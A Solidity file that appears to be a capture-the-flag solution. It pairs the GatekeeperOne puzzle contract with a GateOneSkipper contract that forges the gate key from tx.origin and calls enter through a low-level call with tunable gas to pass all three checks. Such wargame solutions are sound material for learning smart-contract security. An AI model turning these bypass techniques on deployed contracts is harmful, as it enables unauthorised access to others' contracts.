pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GateOneSkipper {
    bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    function Skipper(address _param, uint16 gas) public returns(bool){
        //GatekeeperOne target = GatekeeperOne(_param);
        if(address(_param).call.gas(gas)(bytes4(keccak256("enter(bytes8)")), _gateKey)){
            return true;
        } else {
            return false;
        }
        
    }
}